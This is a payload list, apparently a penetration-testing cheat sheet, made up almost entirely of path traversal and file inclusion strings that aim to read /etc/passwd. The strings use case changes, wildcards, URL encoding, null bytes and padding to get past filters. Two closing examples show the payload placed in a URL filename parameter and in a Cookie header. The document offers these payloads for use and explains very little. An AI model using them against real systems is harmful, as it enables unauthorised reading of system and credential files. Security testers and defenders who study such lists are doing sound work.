## Code Group

```
passwd
PASSWD
/etc/passwd
/ETC/PASSWD
/?tc/passwd
/?TC/PASSWD
/e?c/passwd
/E?C/PASSWD
/et?/passwd
/ET?/PASSWD
/etc/?asswd
/ETC/?ASSWD
/etc/p?sswd
/ETC/P?SSWD
/etc/pa?swd
/ETC/PA?SWD
/etc/pas?wd
/ETC/PAS?WD
/etc/pass?d
/ETC/PASS?D
/etc/passw?
/ETC/PASSW?
"/etc/passwd"
"/ETC/PASSWD"
'/etc/passwd'
'/ETC/PASSWD'
[ /etc/passwd
[ /ETC/PASSWD
] /etc/passwd
] /ETC/PASSWD
_ /etc/passwd
_ /ETC/PASSWD
{ /ETC/PASSWD
アイウエオ /etc/passwd
アイウエオ /ETC/PASSWD
\/etc\/\passwd
\/ETC\/\PASSWD
../../../../etc/passwd
../../../../ETC/PASSWD
../../../../etc/passwd%00
../../../../ETC/PASSWD%00
…./…./…./…./etc/passwd
…./…./…./…./ETC/PASSWD
////etc/passwd
////ETC/PASSWD
%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd  (../../../etc/passwd)
%2e%2e%2f%2e%2e%2f%2e%2e%2f/ETC/PASSWD  (../../../ETC/PASSWD)
%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd  (../../../../etc/passwd)
%2e%2e/%2e%2e/%2e%2e/%2e%2e/ETC/PASSWD  (../../../../ETC/PASSWD)
%2e%2e%5c%2e%2e%5c%2e%2e%5cetc/passwd(..\..\..\etc\passwd)
%2e%2e%5c%2e%2e%5c%2e%2e%5cETC/PASSWD(..\..\..\ETC\PASSWD)
%2e%2e\%2e%2e\%2e%2e\%2e%2e\etc/passwd(..\..\..\etc\passwd)
%2e%2e\%2e%2e\%2e%2e\%2e%2e\ETC/PASSWD(..\..\..\ETC\PASSWD)
%2e%2e%2e%2e%2f%2e%2e%2e%2e%2fetc%2e%2e%2e%2e%2fpasswd(..../…./etc/passwd)
%2e%2e%2e%2e%2f%2e%2e%2e%2e%2fetc%2e%2e%2e%2e%2fPASSWD(..../…./etc/passwd)
      \/etc/\/passwd
      \/ETC/\/PASSWD
:    /etc/passwd
:    /ETC/PASSWD
\\\\    \/etc/\/passwd
\\\\    \/ETC/\/PASSWD
\\\\   : \/etc/passwd
\\\\   : \/ETC/PASSWD
\\\\   : /etc/passwd
\\\\   : /ETC/PASSWD
\…..\\\…..\\\…..\\\etc\\passwd
\…..\\\…..\\\…..\\\ETC\\PASSWD
/…..///…..///…..///etc//passwd
/…..///…..///…..///ETC//PASSWD
../../../..\/etc\/passwd
../../../..\/ETC\/PASSWD

```


## Add malicious code to URL parameters.

```
https://test.com/image/?filename=../../../../etc/passwd
```


## Add malicious code to any field in the request header

```
GET /vulnerable.php HTTP/1.0
Cookie: TEMPLATE=../../../../../../../../../etc/passwd

```
